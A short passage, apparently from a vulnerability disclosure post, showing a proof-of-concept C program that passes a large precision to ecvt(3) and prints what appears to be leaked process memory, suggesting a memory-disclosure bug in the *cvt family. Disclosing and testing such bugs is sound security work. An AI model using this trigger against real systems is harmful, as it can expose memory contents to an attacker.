function like *cvt(3) are also affected. let`s check ecvt(3)

PoC:
- ---
# cat jaja3.c
#include <stdio.h>
#include <stdlib.h>

int main (int argc, char *argv[]){

        int a,b;

        printf("%s", ecvt((double)1,atoi(argv[1]),&a,&b));
        return 0;
}

# ./jaja3 3405
%Y....[some_part_of_memory]
#
- ---

it`s look like a memory disclosure

